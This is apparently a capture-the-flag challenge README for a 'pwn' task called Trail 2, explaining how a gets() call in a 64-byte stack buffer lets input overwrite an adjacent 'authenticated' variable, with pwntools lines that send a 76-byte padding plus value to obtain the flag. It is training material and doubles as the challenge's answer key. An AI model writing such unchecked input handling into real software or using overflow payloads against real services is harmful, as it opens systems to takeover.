# Trail 2

**Category:** trails (pwn)

Run: `docker build -t trail-2 . && docker run -p 5000:5000 trail-2`, then `nc localhost 5000`.

## Solution

Menu with Echo / Get Flag / Quit. Get Flag just tells you you're not authenticated and to look at Echo. The source (`app/overflow.c`) says why:

```c
void echo() {
    int authenticated = 0;
    char buf[64];
    gets(buf);
    ...
    if (authenticated) win();
}
```

`gets` into a 64 byte buffer, with `authenticated` sitting right above it on the stack. Fill the buffer and the padding, and anything non-zero in `authenticated` gets you the flag. The offset is 76.

```python
io.sendlineafter(b'Choice: ', b'1')
io.sendlineafter(b'Say something: ', b'A' * 76 + p32(2))
```

That's `test/exploit.py`.

Flag is per-instance: `h7ctf{0v3rfl0w_$ucc3ss_<uuid>}`
